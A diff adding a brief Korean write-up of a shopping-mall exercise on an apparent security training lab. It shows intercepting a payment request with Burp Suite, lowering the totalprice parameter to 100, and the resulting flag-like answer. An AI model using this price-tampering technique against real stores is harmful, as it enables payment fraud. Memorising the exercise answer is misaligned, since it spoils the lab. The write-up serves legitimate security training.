@@ -1,0 +1,18 @@
+==========================
+
+* 쇼핑몰 문제 10번
+
+==========================
+
+1. https://lab.eqst.co.kr:8110/practice/practice10/order 결제창 열기를 누른 후 버프스위트로 잡고
+GET /practice/practice10/payment?orderlistid=45872
+&productname=%5B%EC%95%A0%ED%94%8C%5D%202020%2013%ED%98%95%20New%20MacBook%20Pro%201TB%20%5BMWP82KH%2FA%5D%20%5B%EC%8B%A4%EB%B2%84%5D
+&totalprice=2763000
+&payment=eqstpay 
+
+에서 totalprice=100으로 변경 후 결제 진행
+
+2. payment_with_eqstpay
+
+==========================
+
